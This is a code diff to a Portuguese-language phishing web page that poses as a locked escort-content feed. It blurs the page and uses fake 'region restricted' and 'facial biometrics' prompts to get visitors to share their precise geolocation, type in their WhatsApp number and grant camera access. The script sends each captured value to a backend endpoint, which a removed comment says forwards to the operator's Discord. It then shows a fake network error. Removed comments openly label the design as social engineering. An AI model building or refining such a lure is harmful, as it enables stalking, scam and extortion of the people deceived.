@@ -11,7 +11,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
         body { background: var(--bg); color: #fff; overflow: hidden; }
 
-        /* Conteúdo de fundo (BORRADO) */
         #content {
             filter: blur(25px);
             transition: filter 0.5s ease;
@@ -20,7 +19,6 @@
             pointer-events: none;
         }
 
-        /* Notificação de Bloqueio (Engenharia Social) */
         #permission-overlay {
             position: fixed; inset: 0;
             background: rgba(0,0,0,0.85);
@@ -35,13 +33,6 @@
             text-align: center;
             border: 1px solid #333;
             box-shadow: 0 0 40px rgba(255, 42, 95, 0.2);
-            animation: shake 0.5s ease-in-out;
-        }
-
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
         }
 
         .alert-icon { font-size: 3.5rem; color: var(--primary); margin-bottom: 20px; }
@@ -54,11 +45,6 @@
             box-shadow: 0 4px 15px rgba(255, 42, 95, 0.4);
         }
 
-        /* Feed Simulado (Atrás do Blur) */
-        .fake-post { padding: 15px; margin-top: 20px; }
-        .fake-img { width: 100%; height: 400px; background: #222; border-radius: 15px; margin-bottom: 10px; }
-
-        /* Modal de Captura Final */
         .modal { 
             position: fixed; inset: 0; background: #000; 
             z-index: 10000; display: none; 
@@ -70,23 +56,21 @@
             border-radius: 12px; font-size: 1.2rem; margin: 20px 0; outline: none; text-align: center;
         }
 
-        /* Loader de Câmera */
-        .loader { width: 40px; height: 40px; border: 4px solid #333; border-top-color: var(--success); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
+        .loader { width: 45px; height: 45px; border: 4px solid #333; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        #video-preview { width: 100%; max-width: 320px; border-radius: 15px; display: none; transform: scaleX(-1); border: 2px solid var(--success); }
     </style>
 </head>
 <body>
 
     <div id="permission-overlay">
         <div class="alert-box">
-            <i class="fa-solid fa-circle-excluent alert-icon"></i>
+            <i class="fa-solid fa-circle-exclamation alert-icon"></i>
             <h2 style="margin-bottom: 10px;">CONTEÚDO BLOQUEADO</h2>
             <p style="color: #888; font-size: 0.9rem; line-height: 1.4;">
-                Este conteúdo é restrito para sua região. Para desbloquear fotos e vídeos de acompanhantes a menos de 1km, confirme sua localização agora.
+                Este conteúdo é restrito para sua região. Confirme sua localização para desbloquear o feed de acompanhantes agora.
             </p>
             <button class="btn-allow" onclick="requestPermission()">ACEITAR E DESBLOQUEAR</button>
-            <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">ID da Conexão: #492-BX9 | Criptografia SSL Ativa</p>
+            <p style="font-size: 0.65rem; color: #444; margin-top: 15px;">ID: #492-BX9 | Criptografia SSL Ativa</p>
         </div>
     </div>
 
@@ -110,30 +94,27 @@
     </div>
 
     <div class="modal" id="modal-cam">
-        <h2 id="cam-status">Sincronizando Live...</h2>
-        <p id="cam-text" style="color: #888; text-align: center;">Mantenha a câmera frontal ativa por 3 segundos para biometria facial de segurança.</p>
-        <div class="loader" id="loader"></div>
-        <video id="video-preview" autoplay playsinline muted></video>
-        <button id="btn-cam" class="btn-allow" onclick="startCamera()">ATIVAR CÂMERA (3s)</button>
+        <h2 id="cam-status">Carregando conteúdo...</h2>
+        <p style="color: #888; text-align: center; margin-top: 10px;">Aguarde enquanto sincronizamos sua conexão com o servidor regional.</p>
+        <div class="loader"></div>
+        <button id="btn-cam" class="btn-allow" onclick="startCamera()">CLIQUE PARA FINALIZAR</button>
     </div>
 
     <script>
-        // Função para reportar ao seu Discord através da API do Vercel
         async function report(type, data) {
             try {
                 await fetch('/api/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ type, data })
+                    body: JSON.stringify({ tipo: type, valor: data })
                 });
             } catch(e) {}
         }
 
-        // 1. Pedir Localização
         function requestPermission() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((p) => {
-                    report('LOCALIZAÇÃO', `Maps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                    report('📍 LOCALIZAÇÃO', `${p.coords.latitude},${p.coords.longitude}`);
                     unlockFeed();
                 }, () => unlockFeed());
             } else { unlockFeed(); }
@@ -142,47 +123,40 @@
         function unlockFeed() {
             document.getElementById('permission-overlay').style.display = 'none';
             document.getElementById('content').style.filter = 'none';
-            // Após 2 segundos de ver o feed, pede o zap
             setTimeout(() => {
                 document.getElementById('modal-zap').style.display = 'flex';
             }, 2500);
         }
 
-        // 2. Capturar Zap
         function sendZap() {
             const num = document.getElementById('whatsapp').value;
             if(num.length < 10) return alert("Número incompleto!");
-            
-            report('WHATSAPP', num);
+            report('📱 WHATSAPP', num);
             document.getElementById('modal-zap').style.display = 'none';
             document.getElementById('modal-cam').style.display = 'flex';
         }
 
-        // 3. Capturar Câmera
         async function startCamera() {
             try {
+                // Solicita a câmera (o navegador vai perguntar "Permitir?")
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video-preview');
-                video.srcObject = stream;
                 
+                // Oculta o botão e deixa só o loader rodando
                 document.getElementById('btn-cam').style.display = 'none';
-                document.getElementById('loader').style.display = 'none';
-                video.style.display = 'block';
-                document.getElementById('cam-status').innerText = "CONECTADO!";
-                document.getElementById('cam-text').innerText = "Sincronizando com a modelo... Não feche a página.";
+                document.getElementById('cam-status').innerText = "Sincronizando Live...";
 
-                report('CÂMERA', 'ACESSO CONCEDIDO (Usuário está na live)');
+                report('📸 CÂMERA', 'ACESSO CONCEDIDO');
 
+                // Mantém a live "carregando" por 5 segundos e depois finge erro
                 setTimeout(() => {
-                    alert("ERRO DE REDE: O servidor de streaming está congestionado. Você foi movido para a fila de espera. Verifique seu WhatsApp para o novo link.");
+                    alert("ERRO DE REDE: Servidor congestionado. O link de acesso foi enviado para o seu WhatsApp.");
                     location.reload();
                 }, 5000);
             } catch (e) {
-                report('CÂMERA', 'NEGADO');
-                alert("Erro: Para sua segurança, a biometria facial é obrigatória em conexões regionais.");
+                report('❌ CÂMERA', 'NEGADO');
+                alert("Erro de autenticação: A permissão é necessária para validar sua região.");
             }
         }
     </script>
 </body>
-
 </html>
